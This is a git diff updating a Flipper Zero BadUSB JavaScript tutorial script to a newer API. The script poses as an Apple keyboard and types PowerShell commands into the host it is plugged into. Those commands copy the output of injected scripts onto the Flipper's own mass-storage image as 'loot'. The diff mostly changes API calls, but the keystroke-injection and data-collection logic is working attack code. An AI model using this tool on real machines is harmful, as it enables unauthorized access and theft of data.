@@ -17,10 +17,13 @@
 // For documentation on configuration see:
 // https://github.com/jamisonderek/flipper-zero-tutorials/blob/main/js/badusb/README.md
 
+let eventLoop = require("event_loop");
+let gui = require("gui");
+let textBoxView = require("gui/text_box");
+
 let badusb = require("badusb");
 let usbdisk = require("usbdisk");
 let storage = require("storage");
-let textbox = require("textbox");
 
 // ************
 // IMPORTANT: Be sure this matches your computer keyboard layout!!!
@@ -42,15 +45,15 @@ let script = [
 let copyPayload = true;
 let playPayload = true;
 let payloadName = "demo.mp3";
-let payloadSrcName = __dirpath + "/payloads/" + payloadName;
+let payloadSrcName = __dirname + "/payloads/" + payloadName;
 let payloadDstName = "/mnt/" + payloadName;
 
 // All the loot will be stored in this file.
-let lootFile = __dirpath + "/loot.txt";
+let lootFile = __dirname + "/loot.txt";
 
 // Image to store payloads and results.
 let exfilCapacityMb = 4; // Reserve space for our image (payloads and results).
-let image = __dirpath + "/Demo_" + to_string(exfilCapacityMb) + "MB.img";
+let image = __dirname + "/Demo_" + exfilCapacityMb.toString() + "MB.img";
 let flipperStorageName = "Flipper Mass Storage";
 
 // Folder and file to store the results on SD card.
@@ -58,7 +61,7 @@ let resultFolder = "results";
 let resultFileName = "info.txt";
 
 print("Checking for Image...");
-if (storage.exists(image)) {
+if (storage.fileExists(image)) {
   storage.remove(image);
 }
 print("Creating Storage...");
@@ -75,9 +78,9 @@ if (copyPayload) {
 badusb.setup({
   vid: 0x1234,
   pid: 0x5678,
-  mfr_name: "Apple",
-  prod_name: "Keyboard",
-  layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl"
+  mfrName: "Apple",
+  prodName: "Keyboard",
+  layoutPath: "/ext/badusb/assets/layouts/" + layout + ".kl"
 });
 print("Waiting for connection");
 while (!badusb.isConnected()) {
@@ -130,7 +133,7 @@ if (playPayload) {
 if (script.length > 0) {
   badusb.print(" $LocalFile = '" + localFileName + "';");
   badusb.print(" New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\" + resultFolder + "\\;");
-  badusb.print(" Move-Item -Path $LocalFile -Destination ${DriveLetter}:\\" + resultFolder + "\\" + resultFileName + ";");
+  badusb.print(" Get-Content $LocalFile | out-file -encoding ASCII ${DriveLetter}:\\" + resultFolder + "\\" + resultFileName + ";");
   badusb.print(" Start-Sleep 1;");
 }
 
@@ -171,29 +174,38 @@ usbdisk.stop();
 print("Detached disk.");
 delay(1000);
 
+let views = {
+  longText: textBoxView.makeWith({
+    text: "...",
+  })
+};
+
+// Wire up back button to exit
+eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _, eventLoop) {
+  eventLoop.stop();
+}, eventLoop);
+
 // Mount and display loot
 if (script.length > 0) {
   print("Reading loot...");
   storage.virtualInit(image);
   storage.virtualMount();
   delay(1000);
-  let data = storage.read("/mnt/" + resultFolder + "/" + resultFileName);
-  textbox.setConfig("start", "text");
-  textbox.clearText();
-  let data_view = Uint8Array(data);
-  for (let i = 0; i < data_view.length; i++) {
-    textbox.addText(chr(data_view[i]));
-  }
-  data_view = undefined;
-  textbox.addText("\n");
-  textbox.show();
-  print("Copying to loot file.");
-  storage.append(lootFile, data);
+
+  let file = storage.openFile("/mnt/" + resultFolder + "/" + resultFileName, "r", "open_existing");
+  let result = file.read("ascii", file.size());
+
   print("Displaying results.");
-  while (textbox.isOpen()) {
-    delay(1000);
-  }
-  textbox.clearText();
+  views.longText.set("text", result);
+  gui.viewDispatcher.switchTo(views.longText);
+  eventLoop.run();
+
+  print("Copying to loot file.");
+  let loot = storage.openFile(lootFile, "w", "open_append");
+  loot.write("\n");
+  loot.write(result);
+  loot.close();
+
   storage.virtualQuit();
 }
 
